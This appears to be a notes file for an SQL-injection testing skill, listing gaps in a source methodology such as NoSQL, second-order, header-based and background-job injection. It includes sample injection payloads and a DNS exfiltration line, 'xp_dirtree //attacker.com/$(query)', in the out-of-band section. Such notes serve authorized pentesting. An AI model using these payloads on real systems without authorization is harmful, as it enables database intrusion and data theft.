# gaps — sqli-hunter

**Source:** Author notes on what the source methodology did NOT cover.

The source (`Guia Compreensivo de Auditoria e Testes de SQL Injection.md`)
is a strong relational-SQL methodology. These are coverage gaps a full
pentest should still address beyond what the source details.

---

## NoSQL Injection (MongoDB, Redis, Elasticsearch, CouchDB)

The source is SQL-only. NoSQL uses operator-injection syntax
(`{"$ne": null}`, `{"$gt": ""}`) — see Hacking APIs Ch 12 for methodology.
If the target uses a document / key-value store, this skill should
delegate to a NoSQLi hunter (not currently in the skill set — flag as
an enhancement).

## Second-Order / Stored SQL Injection

The methodology focuses on first-order (immediate-execution) injection.
Second-order SQLi — where malicious input is stored, then concatenated
into a later query — is not explicitly covered. Test stored SQLi by:
1. Submit payload (e.g. `test'; SELECT ... --`) to a write endpoint.
2. Trigger the READ endpoint that displays/uses that value.
3. Observe whether the payload executes at read time.

## WAF Fingerprinting Before Payload Tuning

The source does not describe the upfront step of fingerprinting the WAF
(Cloudflare, AWS WAF, Imperva, Akamai) so payloads can be tuned to
bypass provider-specific rulesets. In practice, `wafw00f` should run
before payload sweeps on any target behind a CDN.

## Out-of-Band (OOB) Exfiltration via DNS

Time-based blind is mentioned; DNS-based OOB is not. When an internal
database can make outbound DNS (common on MSSQL / Oracle), exfiltration
via `xp_dirtree //attacker.com/$(query)` or `UTL_INADDR.GET_HOST_ADDRESS`
is faster than time-based. Require Burp Collaborator / external listener
and the `destructive_testing: approved` scope.

## Graph/Cypher Injection (Neo4j)

Cypher injection in Neo4j-backed APIs (`MATCH (n:User {id: $id}) RETURN n`)
is structurally SQL-like but has different syntax (`MATCH`, `WHERE`,
`RETURN`). The source does not cover it.

## HTTP/2 and gRPC Header-Based SQLi

Header-reflected SQLi (`X-Forwarded-For`, `User-Agent` being logged into a
SQL audit table) is a real pattern in ad-tech and proxy logs. The
methodology mentions headers as input points but doesn't call out the
common log-ingestion sink pattern specifically.

## ORM-Specific Bypass Paths

Django `raw()` and SQLAlchemy `text()` can still be misused even in
ORM-heavy codebases. The source emphasizes "use parameterized queries"
but doesn't document the specific misuse patterns in each ORM (e.g.,
f-string inside `raw()` string, `literal_column()` misuse in SQLAlchemy).

## Second-Order Blind via Background Jobs

A payload submitted via an API endpoint may only be evaluated in a
queued background job (Sidekiq, Celery, AWS SQS consumer). Callbacks
from the job — not the initial response — are the only signal. This
requires long-polling an OOB listener, which the methodology does not
describe.
